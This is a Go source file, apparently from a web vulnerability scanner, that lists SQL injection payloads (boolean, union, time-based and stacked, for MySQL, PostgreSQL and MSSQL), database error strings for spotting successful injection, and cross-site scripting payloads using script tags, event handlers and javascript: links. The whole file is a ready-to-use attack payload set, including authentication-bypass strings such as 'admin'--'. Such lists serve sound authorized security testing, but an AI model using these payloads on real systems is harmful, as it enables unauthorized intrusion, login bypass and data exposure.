package payload

var SQLiPayloads = []string{
	// Error-based
	"'", "''", "`", "\"", "\\",
	// Boolean-based
	"' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
	"' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
	"\" OR \"1\"=\"1", "\" OR 1=1--",
	"1' OR '1'='1", "1 OR 1=1",
	"' OR 'x'='x", "') OR ('1'='1", "') OR ('1'='1'--",
	// Union-based
	"' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
	"1 UNION SELECT NULL--", "1 UNION ALL SELECT NULL--",
	"1 UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL--",
	// Comment-based
	"admin'--", "admin'#", "1'--", "1'#", "' AND '1'='1",
	// MySQL
	"' AND SLEEP(3)--", "1 AND SLEEP(3)",
	"' AND BENCHMARK(2000000,MD5(1))--",
	"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
	"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
	"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
	// PostgreSQL
	"'; SELECT pg_sleep(3)--",
	"' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
	// MSSQL
	"'; WAITFOR DELAY '0:0:3'--",
	"1; WAITFOR DELAY '0:0:3'--",
	// Stacked
	"'; SELECT SLEEP(3)--", "1; SELECT 1--",
}

var SQLiErrorPatterns = []string{
	"you have an error in your sql syntax",
	"warning: mysql", "warning: pg_",
	"unclosed quotation mark after the character string",
	"quoted string not properly terminated",
	"microsoft ole db provider for sql server",
	"odbc sql server driver",
	"mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
	"pg_query", "pg_exec", "sqlite_exec",
	"ora-01756", "ora-00933", "ora-00907", "ora-01722",
	"sql syntax", "mysql error", "sql error", "database error",
	"syntax error near", "invalid query",
	"mysqli", "sqlstate",
	"supplied argument is not a valid mysql",
	"error in your sql", "division by zero in",
	"expects parameter 1 to be resource",
	"pdo::prepare", "postgresql query failed",
	"npgsql.", "com.mysql.jdbc", "org.postgresql",
	"invalid object name", "column name or number of supplied values",
}

var XSSPayloads = []string{
	// Basic script
	"<script>alert('XSS')</script>",
	"<script>alert(1)</script>",
	"<SCRIPT>alert('XSS')</SCRIPT>",
	"<Script>alert('XSS')</Script>",
	// Event handlers
	"<img src=x onerror=alert('XSS')>",
	"<img src=x onerror=alert(1)>",
	"<img src=\"x\" onerror=\"alert('XSS')\">",
	"<img/src=x/onerror=alert('XSS')>",
	"<body onload=alert('XSS')>",
	"<body/onload=alert('XSS')>",
	"<svg onload=alert('XSS')>",
	"<svg/onload=alert('XSS')>",
	"<input onfocus=alert('XSS') autofocus>",
	"<details open ontoggle=alert('XSS')>",
	"<video src=1 onerror=alert('XSS')>",
	"<audio src=1 onerror=alert('XSS')>",
	"<iframe src=javascript:alert('XSS')></iframe>",
	"<marquee onstart=alert('XSS')>",
	// Attribute breaking
	"\"><script>alert('XSS')</script>",
	"'><script>alert('XSS')</script>",
	"</script><script>alert('XSS')</script>",
	"</title><script>alert('XSS')</script>",
	"</textarea><script>alert('XSS')</script>",
	// JS protocol
	"<a href=javascript:alert('XSS')>click</a>",
	"<form action=javascript:alert('XSS')><button>go</button></form>",
	// SVG
	"<svg><script>alert('XSS')</script></svg>",
	"<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
	// Template
	"`<script>alert('XSS')</script>`",
}
